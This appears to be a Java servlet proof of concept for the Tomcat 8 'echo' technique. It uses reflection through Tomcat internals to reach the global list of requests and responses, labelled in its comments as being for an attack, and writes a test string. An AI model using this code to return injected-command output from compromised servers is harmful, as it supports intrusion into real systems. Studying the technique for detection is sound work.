package com.example.TomcatHalfEcho.Controller;

import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;


import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;


// 适用于 Tomcat8，获取全局 response 进行攻击

@WebServlet(urlPatterns = "/servletAttack")
public class GlobalContextAttack extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

        try {
            // 获取Tomcat ClassLoader context
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();

            // 获取standardContext的context
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);//将变量设置为可访问
            org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext) context.get(standardContext);

            // 获取ApplicationContext的service
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);//将变量设置为可访问
            StandardService standardService = (StandardService) service.get(ApplicationContext);

            // 获取StandardService的connectors
            Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectorsField.setAccessible(true);//将变量设置为可访问
            org.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[]) connectorsField.get(standardService);

            // 获取AbstractProtocol的handler
            org.apache.coyote.ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();
            Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");
            handlerField.setAccessible(true);
            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);

            // 获取内部类ConnectionHandler的global
            Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
            globalField.setAccessible(true);
            RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);

            // 获取RequestGroupInfo的processors
            Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            processors.setAccessible(true);
            java.util.List<RequestInfo> RequestInfolist = (java.util.List<RequestInfo>) processors.get(global);

            // 获取Response，并做输出处理
            Field reqField = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            reqField.setAccessible(true);
            for (RequestInfo requestInfo : RequestInfolist) {//遍历
                org.apache.coyote.Request coyoteReq = (org.apache.coyote.Request )reqField.get(requestInfo);//获取request
                org.apache.catalina.connector.Request connectorRequest = ( org.apache.catalina.connector.Request)coyoteReq.getNote(1);//获取catalina.connector.Request类型的Request
                org.apache.catalina.connector.Response connectorResponse = connectorRequest.getResponse();
                java.io.Writer w = response.getWriter();//获取Writer
                Field responseField = ResponseFacade.class.getDeclaredField("response");
                responseField.setAccessible(true);
                Field usingWriter = Response.class.getDeclaredField("usingWriter");
                usingWriter.setAccessible(true);
                usingWriter.set(connectorResponse, Boolean.FALSE);//初始化
                w.write("1111");
                w.flush();//刷新
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }
}
 